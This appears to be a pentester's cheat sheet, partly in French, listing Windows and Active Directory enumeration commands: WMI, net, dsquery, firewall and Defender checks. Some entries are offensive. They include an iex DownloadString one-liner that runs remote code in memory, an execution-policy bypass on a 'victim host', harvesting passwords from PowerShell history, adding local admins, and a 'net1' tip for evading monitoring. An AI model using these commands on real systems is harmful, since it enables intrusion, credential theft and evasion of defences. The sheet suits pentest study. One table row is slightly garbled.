# Living Off The Land

## Living Off The Land

|                        Command                        |                                           Result                                           |
| :---------------------------------------------------: | :----------------------------------------------------------------------------------------: |
|                        hostname                       |                                    Prints the PC's Name                                    |
|        \[System.Environment]::OSVersion.Version       |                        Prints out the OS version and revision level                        |
| wmic qfe get Caption,Description,HotFixID,InstalledOn |                     Prints the patches and hotfixes applied to the host                    |
|                     ipconfig /all                     |                     Prints out network adapter state and configurations                    |
|                    set %USERDOMAIN%                   |          Displays the domain name to which the host belongs (ran from CMD-prompt)          |
|                   set %logonserver%                   | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |

|                                                      Cmd-Let                                                     |                                                                                                                 Description                                                                                                                 |
| :--------------------------------------------------------------------------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
|                                                    Get-Module                                                    |                                                                                                   Lists available modules loaded for use.                                                                                                   |
|                                             Get-ExecutionPolicy -List                                            |                                                                                      Will print the execution policy settings for each scope on a host.                                                                                     |
|                                     Set-ExecutionPolicy Bypass -Scope Process                                    | This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost\_history.txt |           With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.           |
|                                                Get-ChildItem Env:                                                |                                                                         ft Key,Value Return environment values such as key paths, users, computer information, etc.                                                                         |
|       powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); "       |                                                                    This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                   |

Downgrader la version de powershell:

```powershell
powershell.exe -version 2
```

Énumérer les règles du Firewall Windows:

```powershell
netsh advfirewall show allprofiles
```

Vérifier si Windows Defender est actif ou non (CMD.exe):

```powershell
sc query windefend
```

Énumérer le status des différentes serices de Windows Defender:

```powershell
Get-MpComputerStatus
```

Énumérer les utilisateurs actuellement loggués sur la machine:

```powershell
qwinsta
```

## Network

| Networking Commands |                                                    Description                                                   |
| :-----------------: | :--------------------------------------------------------------------------------------------------------------: |
|        arp -a       |                                  Lists all known hosts stored in the arp table.                                  |
|    ipconfig /all    |            Prints out adapter settings for the host. We can figure out the network segment from here.            |
|     route print     | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
|          n          |                                            etsh advfirewall show state                                           |

## Windows Management Instrumentation (WMI)

|                                       Command                                      |                                               Description                                              |
| :--------------------------------------------------------------------------------: | :----------------------------------------------------------------------------------------------------: |
|                wmic qfe get Caption,Description,HotFixID,InstalledOn               |                     Prints the patch level and description of the Hotfixes applied                     |
| wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List |                Displays basic host information to include any attributes within the list               |
|                           wmic process list /format:list                           |                                   A listing of all processes on host                                   |
|                           wmic ntdomain list /format:list                          |                      Displays information about the Domain and Domain Controllers                      |
|                         wmic useraccount list /format:list                         | Displays information about all local accounts and any domain accounts that have logged into the device |
|                            wmic group list /format:list                            |                                   Information about all local groups                                   |
|                          wmic sysaccount list /format:list                         |          Dumps information about any system accounts that are being used as service accounts.          |

## commande Net

|                     Command                    |                                                         Description                                                        |
| :--------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------: |
|                  net accounts                  |                                           Information about password requirements                                          |
|              net accounts /domain              |                                                 Password and lockout policy                                                |
|                net group /domain               |                                               Information about domain groups                                              |
|        net group "Domain Admins" /domain       |                                           List users with domain admin privileges                                          |
|      net group "domain computers" /domain      |                                             List of PCs connected to the domain                                            |
|     net group "Domain Controllers" /domain     |                                           List PC accounts of domains controllers                                          |
|    net group \<domain\_group\_name> /domain    |                                               User that belongs to the group                                               |
|               net groups /domain               |                                                    List of domain groups                                                   |
|                 net localgroup                 |                                                    All available groups                                                    |
|      net localgroup administrators /domain     | List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |
|          net localgroup Administrators         |                                             Information about a group (admins)                                             |
| net localgroup administrators \[username] /add |                                                 Add user to administrators                                                 |
|                    net share                   |                                                    Check current shares                                                    |
|        net user \<ACCOUNT\_NAME> /domain       |                                       Get information about a user within the domain                                       |
|                net user /domain                |                                                List all users of the domain                                                |
|               net user %username%              |                                             Information about the current user                                             |
|           net use x: \computer\share           |                                                   Mount the share locally                                                  |
|                    net view                    |                                                   Get a list of computers                                                  |
|       net view /all /domain\[:domainname]      |                                                    Shares on the domains                                                   |
|             net view \computer /ALL            |                                                  List shares of a computer                                                 |
|                net view /domain                |                                                  List of PCs of the domain                                                 |

Tips : on peut imaginer que la commande "net" est activement surveillée. Dans ce cas, la commande peut être remplacée par "net1" qui le sera peut-être moins.

## Dsquery

Dsquery est disponible sur les OS windows récents, et permet d'énumérer des objets d'active directory.

Lister les utilisateurs du domaine:

```powershell
dsquery user
```

Énumérer les host enregistrés sur le domaine:

```powershell
dsquery computer
```
